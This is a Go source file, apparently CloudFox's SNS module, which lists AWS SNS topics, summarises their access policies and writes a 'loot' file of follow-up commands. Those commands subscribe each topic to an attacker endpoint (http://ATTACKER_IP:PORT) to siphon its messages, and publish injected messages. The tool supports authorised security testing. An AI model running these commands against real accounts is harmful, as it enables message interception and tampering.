package aws

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"unicode/utf8"

	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/internal/aws/policy"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/aws/arn"
	"github.com/aws/aws-sdk-go-v2/service/sns"
	"github.com/aws/aws-sdk-go-v2/service/sns/types"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/bishopfox/awsservicemap"
	"github.com/sirupsen/logrus"
)

type SNSModule struct {
	// General configuration data
	SNSClient     SNSClientInterface
	AWSRegions    []string
	AWSProfile    string
	Caller        sts.GetCallerIdentityOutput
	StorePolicies bool
	OutputFormat  string
	Goroutines    int
	WrapTable     bool

	// Main module data
	Topics         []SNSTopic
	CommandCounter internal.CommandCounter
	// Used to store output data for pretty printing
	output internal.OutputData2
	modLog *logrus.Entry
}

type SNSClientInterface interface {
	ListTopics(ctx context.Context, params *sns.ListTopicsInput, optFns ...func(*sns.Options)) (*sns.ListTopicsOutput, error)
	GetTopicAttributes(ctx context.Context, params *sns.GetTopicAttributesInput, optFns ...func(*sns.Options)) (*sns.GetTopicAttributesOutput, error)
}

type SNSTopic struct {
	ARN                   string
	Name                  string
	Region                string
	Policy                policy.Policy
	PolicyJSON            string
	Access                string
	IsPublic              string
	IsConditionallyPublic string
	Statement             string
	Actions               string
	ConditionText         string
	ResourcePolicySummary string
}

func (m *SNSModule) PrintSNS(outputFormat string, outputDirectory string, verbosity int) {
	// These struct values are used by the output module
	m.output.Verbosity = verbosity
	m.output.Directory = outputDirectory
	m.output.CallingModule = "sns"
	m.modLog = internal.TxtLog.WithFields(logrus.Fields{
		"module": m.output.CallingModule,
	})
	if m.AWSProfile == "" {
		m.AWSProfile = internal.BuildAWSPath(m.Caller)
	}
	m.output.FilePath = filepath.Join(outputDirectory, "cloudfox-output", "aws", fmt.Sprintf("%s-%s", m.AWSProfile, aws.ToString(m.Caller.Account)))

	fmt.Printf("[%s][%s] Enumerating SNS topics for account %s.\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), aws.ToString(m.Caller.Account))

	wg := new(sync.WaitGroup)
	semaphore := make(chan struct{}, m.Goroutines)

	// Create a channel to signal the spinner aka task status goroutine to finish
	spinnerDone := make(chan bool)
	//fire up the the task status spinner/updated
	go internal.SpinUntil(m.output.CallingModule, &m.CommandCounter, spinnerDone, "regions")

	//create a channel to receive the objects
	dataReceiver := make(chan SNSTopic)

	// Create a channel to signal to stop
	receiverDone := make(chan bool)
	go m.Receiver(dataReceiver, receiverDone)

	for _, region := range m.AWSRegions {
		wg.Add(1)
		m.CommandCounter.Pending++
		go m.executeChecks(region, wg, semaphore, dataReceiver)

	}

	wg.Wait()
	// Send a message to the spinner goroutine to close the channel and stop
	spinnerDone <- true
	<-spinnerDone
	// Send a message to the data receiver goroutine to close the channel and stop
	receiverDone <- true
	<-receiverDone

	// add - if struct is not empty do this. otherwise, dont write anything.
	m.output.Headers = []string{

		"ARN",
		"Public?",
		"Resource Policy Summary",
	}

	sort.SliceStable(m.Topics, func(i, j int) bool {
		return m.Topics[i].ARN < m.Topics[j].ARN
	})

	// Table rows
	for i := range m.Topics {
		m.output.Body = append(
			m.output.Body,
			[]string{
				m.Topics[i].ARN,
				m.Topics[i].IsPublic,
				m.Topics[i].ResourcePolicySummary,
			},
		)

	}
	if len(m.output.Body) > 0 {
		//m.output.OutputSelector(outputFormat)
		//internal.OutputSelector(verbosity, outputFormat, m.output.Headers, m.output.Body, m.output.FilePath, m.output.CallingModule, m.output.CallingModule, m.WrapTable, m.AWSProfile)
		//m.writeLoot(m.output.FilePath, verbosity, m.AWSProfile)
		o := internal.OutputClient{
			Verbosity:     verbosity,
			CallingModule: m.output.CallingModule,
			Table: internal.TableClient{
				Wrap: m.WrapTable,
			},
		}
		o.Table.TableFiles = append(o.Table.TableFiles, internal.TableFile{
			Header: m.output.Headers,
			Body:   m.output.Body,
			Name:   m.output.CallingModule,
		})
		o.PrefixIdentifier = m.AWSProfile
		o.Table.DirectoryName = filepath.Join(outputDirectory, "cloudfox-output", "aws", fmt.Sprintf("%s-%s", m.AWSProfile, aws.ToString(m.Caller.Account)))
		o.WriteFullOutput(o.Table.TableFiles, nil)
		m.writeLoot(o.Table.DirectoryName, verbosity, m.AWSProfile)
		fmt.Printf("[%s][%s] %s topics found.\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), strconv.Itoa(len(m.output.Body)))
		fmt.Printf("[%s][%s] Access policies stored to: %s\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), m.getLootDir())
	} else {
		fmt.Printf("[%s][%s] No topics found, skipping the creation of an output file.\n", cyan(m.output.CallingModule), cyan(m.AWSProfile))
	}
	fmt.Printf("[%s][%s] For context and next steps: https://github.com/BishopFox/cloudfox/wiki/AWS-Commands#%s\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), m.output.CallingModule)

}

func (m *SNSModule) executeChecks(r string, wg *sync.WaitGroup, semaphore chan struct{}, dataReceiver chan SNSTopic) {
	defer wg.Done()

	servicemap := &awsservicemap.AwsServiceMap{
		JsonFileSource: "DOWNLOAD_FROM_AWS",
	}
	res, err := servicemap.IsServiceInRegion("sns", r)
	if err != nil {
		m.modLog.Error(err)
	}
	if res {
		m.CommandCounter.Total++
		wg.Add(1)
		m.getSNSTopicsPerRegion(r, wg, semaphore, dataReceiver)
	}
}

func (m *SNSModule) Receiver(receiver chan SNSTopic, receiverDone chan bool) {
	defer close(receiverDone)
	for {
		select {
		case data := <-receiver:
			m.Topics = append(m.Topics, data)
		case <-receiverDone:
			receiverDone <- true
			return
		}
	}
}

func (m *SNSModule) writeLoot(outputDirectory string, verbosity int, profile string) {
	path := filepath.Join(outputDirectory, "loot")
	err := os.MkdirAll(path, os.ModePerm)
	if err != nil {
		m.modLog.Error(err.Error())
	}
	lootCommandsFile := filepath.Join(path, "sns-commands.txt")

	var out string
	out = out + fmt.Sprintln("#############################################")
	out = out + fmt.Sprintln("# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox")
	out = out + fmt.Sprintln("# Set the $profile environment variable to the profile you are going to use to inspect the buckets.")
	out = out + fmt.Sprintln("# E.g., export profile=dev-prod.")
	out = out + fmt.Sprintln("#############################################")
	out = out + fmt.Sprintln("")

	for _, topic := range m.Topics {

		out = out + fmt.Sprintln("# "+strings.Repeat("-", utf8.RuneCountInString(topic.Name)+7))
		out = out + fmt.Sprintf("# Topic: %s\n", topic.Name)
		out = out + fmt.Sprintln("# "+strings.Repeat("-", utf8.RuneCountInString(topic.Name)+7))
		out = out + fmt.Sprintln("# Subscribe to the topic using an attacker controlled HTTP/HTTPS endpoint")
		out = out + fmt.Sprintln("")
		out = out + fmt.Sprintf("aws --profile $profile --region %s sns subscribe --topic-arn %s --protocol http --notification-endpoint http://ATTACKER_IP:PORT\n", topic.Region, topic.ARN)
		out = out + fmt.Sprintf("aws --profile $profile --region %s sns subscribe --topic-arn %s --protocol https --notification-endpoint https://ATTACKER_IP:PORT\n", topic.Region, topic.ARN)
		out = out + fmt.Sprintln("")
		out = out + fmt.Sprintln("# NOTE: You will have to confirm the subscription using the URL sent to your attacker controlled http service")
		out = out + fmt.Sprintln("# NOTE: Once you have confirmed the subscription, your attacker controlled IP will received all messages published to the topic.")
		out = out + fmt.Sprintln("")

		out = out + fmt.Sprintln("# Publish messages to an existing topic without an attributes file")
		out = out + fmt.Sprintln("")
		out = out + fmt.Sprintln("# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject")
		out = out + fmt.Sprintln("# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the")
		out = out + fmt.Sprintln("# WARNING: messages are consumed, you should leave fuzzing to non-production environments.")
		out = out + fmt.Sprintf("aws --profile $profile --region %s sns publish --topic-arn %s --message \"[INSERT MESSAGE BODY]\"\n\n", topic.Region, topic.ARN)
		out = out + fmt.Sprintln("")
		out = out + fmt.Sprintln("# Send message to the topic with attributes file (You'll have to create and populate the file)")
		out = out + fmt.Sprintln("")
		out = out + fmt.Sprintln("# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject")
		out = out + fmt.Sprintln("# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the")
		out = out + fmt.Sprintln("# WARNING: messages are consumed, you should leave fuzzing to non-production environments.")
		out = out + fmt.Sprintf("aws --profile $profile --region %s  sns publish --topic-arn %s --message \"[INSERT MESSAGE BODY] --message-attributes file://./file.json\"\n\n", topic.Region, topic.ARN)

	}

	err = os.WriteFile(lootCommandsFile, []byte(out), 0644)
	if err != nil {
		m.modLog.Error(err.Error())
	}

	if verbosity > 2 {
		fmt.Println()
		fmt.Printf("[%s][%s] %s \n", cyan(m.output.CallingModule), cyan(m.AWSProfile), green("Use the commands below to send/receive sqs messages if you have right permissions."))
		fmt.Print(out)
		fmt.Printf("[%s][%s] %s \n", cyan(m.output.CallingModule), cyan(m.AWSProfile), green("End of loot file."))
	}

	fmt.Printf("[%s][%s] Loot written to [%s]\n", cyan(m.output.CallingModule), cyan(m.AWSProfile), lootCommandsFile)

}

func (m *SNSModule) getSNSTopicsPerRegion(r string, wg *sync.WaitGroup, semaphore chan struct{}, dataReceiver chan SNSTopic) {
	defer func() {
		m.CommandCounter.Executing--
		m.CommandCounter.Complete++
		wg.Done()

	}()
	semaphore <- struct{}{}
	defer func() {
		<-semaphore
	}()

	ListTopics, err := m.listTopics(r)
	if err != nil {
		m.modLog.Error(err.Error())
		return
	}

	for _, t := range ListTopics {
		topic, err := m.getTopicWithAttributes(aws.ToString(t.TopicArn), r)
		if err != nil {
			m.modLog.Error(err.Error())
			m.CommandCounter.Error++
			break
		}
		parsedArn, err := arn.Parse(aws.ToString(t.TopicArn))
		if err != nil {
			topic.Name = aws.ToString(t.TopicArn)
		}
		topic.Name = parsedArn.Resource
		topic.Region = parsedArn.Region

		// easier to just set the default state to be no and only flip it to yes if we have a case that matches
		topic.IsPublic = "No"
		if !topic.Policy.IsEmpty() {
			m.analyseTopicPolicy(topic, dataReceiver)
		} else {
			// If the topic policy "resource policy" is empty, the only principals that have permissions
			// are those that are granted access by IAM policies
			//topic.Access = "Private. Access allowed by IAM policies"
			topic.Access = "Only intra-account access (via IAM) allowed"
			dataReceiver <- *topic

		}

	}

}

func (m *SNSModule) listTopics(region string) ([]types.Topic, error) {
	var PaginationControl *string
	var topics []types.Topic

	for {
		ListTopics, err := m.SNSClient.ListTopics(
			context.TODO(),
			&sns.ListTopicsInput{
				NextToken: PaginationControl,
			},
			func(o *sns.Options) {
				o.Region = region
			},
		)
		if err != nil {
			return nil, err
		}

		for _, t := range ListTopics.Topics {
			topics = append(topics, t)
		}

		// The "NextToken" value is nil when there's no more data to return.
		if ListTopics.NextToken != nil {
			PaginationControl = ListTopics.NextToken
		} else {
			PaginationControl = nil
			break
		}
	}

	return topics, nil
}

func (m *SNSModule) getTopicWithAttributes(topicARN string, region string) (*SNSTopic, error) {
	topic := &SNSTopic{
		ARN: topicARN,
	}

	GetTopicAttributes, err := m.SNSClient.GetTopicAttributes(
		context.TODO(),
		&sns.GetTopicAttributesInput{
			TopicArn: aws.String(topicARN),
		},
		func(o *sns.Options) {
			o.Region = region
		},
	)
	if err != nil {
		return nil, fmt.Errorf("GetTopicAttributes(%s) failed: %s", topicARN, err)
	}

	if policyJSON, ok := GetTopicAttributes.Attributes["Policy"]; ok {
		policy, err := policy.ParseJSONPolicy([]byte(policyJSON))
		if err != nil {
			return nil, fmt.Errorf("parsing topic access policy (%s) as JSON: %s", topicARN, err)
		}

		topic.PolicyJSON = policyJSON
		topic.Policy = policy
	}

	return topic, nil
}

func (m *SNSModule) analyseTopicPolicy(topic *SNSTopic, dataReceiver chan SNSTopic) {
	m.storeAccessPolicy(topic)

	if topic.Policy.IsPublic() && !topic.Policy.IsConditionallyPublic() {
		topic.IsPublic = "YES"
	}

	for i, statement := range topic.Policy.Statement {
		var prefix string = ""
		if len(topic.Policy.Statement) > 1 {
			prefix = fmt.Sprintf("Statement %d says: ", i)
			topic.ResourcePolicySummary = topic.ResourcePolicySummary + prefix + statement.GetStatementSummaryInEnglish(*m.Caller.Account)
		} else {
			topic.ResourcePolicySummary = statement.GetStatementSummaryInEnglish(*m.Caller.Account)
		}
		topic.ResourcePolicySummary = strings.TrimSuffix(topic.ResourcePolicySummary, "\n")

	}
	dataReceiver <- *topic

}

func (m *SNSModule) storeAccessPolicy(topic *SNSTopic) {
	f := filepath.Join(m.getLootDir(), fmt.Sprintf("%s.json", m.getTopicName(topic.ARN)))

	if err := m.storeFile(f, topic.PolicyJSON); err != nil {
		m.modLog.Error(err.Error())
		m.CommandCounter.Error++
	}
}

func (m *SNSModule) getLootDir() string {
	return filepath.Join(m.output.FilePath, "loot", "sns-policies")
}

// Example: arn:aws:sns:us-east-2:123456789012:MyTopic
func (m *SNSModule) getTopicName(topicARN string) string {
	tokens := strings.SplitN(topicARN, ":", 6)
	if len(tokens) != 6 {
		return ""
	}
	return tokens[5]
}

func (m *SNSModule) storeFile(filename string, policy string) error {
	err := os.MkdirAll(filepath.Dir(filename), 0750)
	if err != nil && !os.IsExist(err) {
		return fmt.Errorf("creating parent dirs: %s", err)
	}

	return os.WriteFile(filename, []byte(policy), 0644)

}
